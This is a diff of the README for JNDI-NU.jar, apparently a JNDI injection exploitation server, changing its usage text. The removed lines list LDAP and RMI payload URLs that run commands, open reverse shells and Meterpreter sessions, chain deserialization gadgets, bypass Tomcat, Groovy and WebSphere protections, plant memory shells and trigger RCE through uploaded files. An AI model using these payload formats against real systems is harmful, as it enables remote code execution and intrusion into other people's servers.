@@ -7,54 +7,12 @@
 ```
 Usage: java -jar JNDI-NU.jar [options]
   Options:
-  * -i, --ip       Local ip address
-    -rl, --rmiPort rmi bind port (default: 10990)
-    -l, --ldapPort Ldap bind port (default: 1389)
-    -p, --httpPort Http bind port (default: 8080)
-    -c, --Command  rmi gadgets System Command
-    -u, --usage    Show usage (default: false)
-    -h, --help     Show this help
-```
-
-~~使用 ```java -jar JNDI-NU.jar.jar -u``` 查看支持的 LDAP 格式~~(取消该帮助信息，有需要在此处看即可)
-
-```
-Supported LADP Queries：
-* all words are case INSENSITIVE when send to ldap server
-
-[+] Basic Queries: ldap://0.0.0.0:1389/Basic/[PayloadType]/[Params], e.g.
-    ldap://0.0.0.0:1389/Basic/Dnslog/[domain]
-    ldap://0.0.0.0:1389/Basic/nu1r/[cmd]
-    ldap://0.0.0.0:1389/Basic/nu1r/Base64/[base64_encoded_cmd]
-    ldap://0.0.0.0:1389/Basic/ReverseShell/[ip]/[port]  ---windows NOT supported
-    rmi://0.0.0.0:1099/Bypass
-
-[+] Deserialize Queries: ldap://0.0.0.0:1389/Deserialization/[GadgetType]/[PayloadType]/[Params], e.g.
-    ldap://0.0.0.0:1389/Deserialization/URLDNS/[domain]
-    ldap://0.0.0.0:1389/Deserialization/CommonsCollectionsK1/Dnslog/[domain]
-    ldap://0.0.0.0:1389/Deserialization/CommonsCollections1/nu1r/Base64/[base64_encoded_cmd]
-    ldap://0.0.0.0:1389/Deserialization/CommonsBeanutils1/ReverseShell/[ip]/[port]  ---windows NOT supported
-    ldap://0.0.0.0:1389/Deserialization/CommonsBeanutils2/TomcatEcho
-
-[+] TomcatBypass Queries
-    ldap://0.0.0.0:1389/TomcatBypass/Dnslog/[domain]
-    ldap://0.0.0.0:1389/TomcatBypass/nu1r/[cmd]
-    ldap://0.0.0.0:1389/TomcatBypass/nu1r/Base64/[base64_encoded_cmd]
-    ldap://0.0.0.0:1389/TomcatBypass/ReverseShell/[ip]/[port]  ---windows NOT supported
-    ldap://0.0.0.0:1389/TomcatBypass/Meterpreter/[ip]/[port]  ---java/meterpreter/reverse_tcp
-
-[+] GroovyBypass Queries
-    ldap://0.0.0.0:1389/GroovyBypass/nu1r/[cmd]
-    ldap://0.0.0.0:1389/GroovyBypass/nu1r/Base64/[base64_encoded_cmd]
-
-[+] WebsphereBypass Queries
-    ldap://0.0.0.0:1389/WebsphereBypass/List/file=[file or directory]
-    ldap://0.0.0.0:1389/WebsphereBypass/Upload/Dnslog/[domain]
-    ldap://0.0.0.0:1389/WebsphereBypass/Upload/nu1r/[cmd]
-    ldap://0.0.0.0:1389/WebsphereBypass/Upload/nu1r/Base64/[base64_encoded_cmd]
-    ldap://0.0.0.0:1389/WebsphereBypass/Upload/ReverseShell/[ip]/[port]  ---windows NOT supported
-    ldap://0.0.0.0:1389/WebsphereBypass/Upload/WebsphereMemshell
-    ldap://0.0.0.0:1389/WebsphereBypass/RCE/path=[uploaded_jar_path]   ----e.g: ../../../../../tmp/jar_cache7808167489549525095.tmp
+  * -i,  --ip       Local ip address  (default: 0.0.0.0)
+    -rP, --rmiPort  rmi bind port (default: 1099)
+    -lP, --ldapPort Ldap bind port (default: 1389)
+    -hP, --httpPort Http bind port (default: 3456)
+    -c,  --command  RMI this command
+    -h,  --help     Show this help
 ```
 
 * 目前支持的所有 ```PayloadType``` 为
